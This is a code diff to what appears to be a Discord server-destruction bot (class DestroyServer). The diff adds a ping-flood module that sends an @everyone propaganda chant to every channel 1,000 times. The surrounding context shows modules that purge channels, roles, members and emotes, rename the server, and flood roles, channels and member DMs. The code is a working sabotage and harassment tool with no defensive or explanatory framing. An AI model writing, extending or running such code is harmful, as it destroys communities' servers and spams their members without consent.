@@ -29,7 +29,7 @@ class DestroyServer(chattrigger.ChatTrigger):
 
 		stage1modules = [self.channelpurge, self.rolepurge, self.memberpurge, self.emotepurge, self.servernamechange] # stage 1: burn the town
 
-		stage2modules = [self.roleflood, self.channelflood, self.memberdmflood] # stage 2: salt the earth
+		stage2modules = [self.roleflood, self.channelflood, self.memberdmflood, self.pingflood] # stage 2: salt the earth
 
 		loop = asyncio.get_event_loop()
 
@@ -307,9 +307,10 @@ Kick Members: {selfpermissions.kick_members}'''
 		print("starting ping flood")
 		await self.message.channel.send("starting ping flood")
 
-		for i in targetserver.channels:
+		for i in range(1000):
+			for i in targetserver.channels:
 
-			await i.send('''@everyone
+				await i.send('''@everyone
 
 **All hail the crusaders of John**
 
@@ -332,3 +333,5 @@ The crusaders shall be revered in history
 Immortalized after inevitable victory
 The heretics will fall with our mighty assault
 Crusader, Crusader, Ioannes Vult''')
+
+		await self.message.channel.send(f"Done Ping Flood")
